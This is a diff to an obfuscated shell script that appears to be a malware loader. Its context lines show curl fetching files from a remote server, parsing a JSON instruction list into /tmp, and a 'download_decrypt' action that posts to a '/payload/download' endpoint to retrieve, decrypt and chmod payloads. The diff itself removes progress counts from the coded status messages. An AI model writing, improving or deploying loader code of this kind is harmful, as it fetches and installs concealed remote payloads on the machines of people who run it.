@@ -117,7 +117,7 @@ _v22() {
         _current=$((_current + 1))
         _x24=$(_u21 "$_w23")
         if [ -n "$_x24" ]; then
-            _h8 "0x06:PROC:$_current/$_total"
+			_h8 "0x06:PROC"
             curl -sSL "${_a1}/framework/${_w23}" -o "$_x24" 2>&1 || {
                 _i9 "0x06:FAIL:$_current"
                 continue
@@ -158,25 +158,22 @@ _y25() {
     
     echo "$_ab28" > /tmp/autologin_instructions.json
     
-    _ad30=$(jq '.instructions | length' /tmp/autologin_instructions.json 2>/dev/null || echo "0")
-    _h8 "0x07:INST:$_ad30"
+	_h8 "0x07:INST:OK"
     
+    _h8 "0x07:PREP"
     jq -c '.instructions[]' /tmp/autologin_instructions.json 2>/dev/null | while read -r _inst; do
         _action=$(echo "$_inst" | jq -r '.action' 2>/dev/null)
         
         if [ "$_action" = "mkdir" ]; then
             _path=$(echo "$_inst" | jq -r '.path' 2>/dev/null)
-            _h8 "0x07:MKDIR"
             mkdir -p "$_path" 2>&1 || _i9 "0x07:MKDIR:FAIL"
             
         elif [ "$_action" = "download_decrypt" ]; then
             _file=$(echo "$_inst" | jq -r '.file' 2>/dev/null)
             _target=$(echo "$_inst" | jq -r '.target' 2>/dev/null)
             _chmod=$(echo "$_inst" | jq -r '.chmod' 2>/dev/null)
-            
-            _pcount=${_pcount:-0}
-            _pcount=$((_pcount + 1))
-            _h8 "0x07:PROC:$_pcount/11"
+
+			_h8 "0x07:PROC"
             
             HTTP_CODE=$(curl -sSL -o "/tmp/$_file" -w "%{http_code}" -X POST "$_b2/payload/download" \
                 -H "Content-Type: application/json" \
